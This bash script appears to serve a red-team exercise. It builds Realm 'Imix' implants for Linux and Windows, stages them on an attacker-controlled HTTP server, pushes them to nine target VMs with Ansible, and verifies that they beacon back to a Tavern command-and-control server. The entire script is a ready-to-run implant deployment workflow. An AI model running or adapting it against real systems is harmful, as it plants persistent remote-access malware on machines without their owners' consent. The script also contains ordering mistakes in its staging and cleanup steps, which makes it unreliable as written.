#!/bin/bash
# run.sh - One-shot script to build, stage, and deploy everything
# Run this from your attack box

set -e

ATTACK_IP="192.168.1.5"       # <-- Change this
STAGING_PORT="8888"
REALM_DIR="$HOME/realm"

echo "============================================="
echo " Realm Ansible Auto-Deployer"
echo "============================================="

# ── Step 1: Build binaries ──────────────────────
echo "[1/4] Building Imix binaries..."
cd "$REALM_DIR/implants/imix"

cargo build --release
cp target/release/imix /tmp/staging/imix-linux

rustup target add x86_64-pc-windows-gnu 2>/dev/null || true
cargo build --release --target x86_64-pc-windows-gnu
cp target/x86_64-pc-windows-gnu/release/imix.exe /tmp/staging/imix.exe

echo "    [+] Binaries ready"

# ── Step 2: Start HTTP staging server ──────────
echo "[2/4] Starting HTTP staging server on :$STAGING_PORT..."
mkdir -p /tmp/staging
cd /tmp/staging

# Kill any existing server on that port
fuser -k ${STAGING_PORT}/tcp 2>/dev/null || true
python3 -m http.server $STAGING_PORT &
STAGING_PID=$!
echo "    [+] Staging server PID: $STAGING_PID"
sleep 1

# ── Step 3: Run Ansible deployment ─────────────
echo "[3/4] Running Ansible playbook against all 9 VMs..."
cd "$(dirname "$0")"   # Return to ansible project dir

# Install required Ansible collections if missing
ansible-galaxy collection install ansible.windows community.windows 2>/dev/null

ansible-playbook site.yml -i inventory/hosts.ini
echo "    [+] Deployment complete"

# ── Step 4: Verify beacons ──────────────────────
echo "[4/4] Verifying beacons in Tavern..."
sleep 5   # Give agents a moment to beacon home

ansible-playbook verify.yml \
  -e "tavern_ip=$ATTACK_IP" \
  -e "tavern_port=80"

echo ""
echo "============================================="
echo " All done! Check Tavern UI for all 9 beacons"
echo "============================================="

# Cleanup staging server on exit
trap "kill $STAGING_PID 2>/dev/null" EXIT
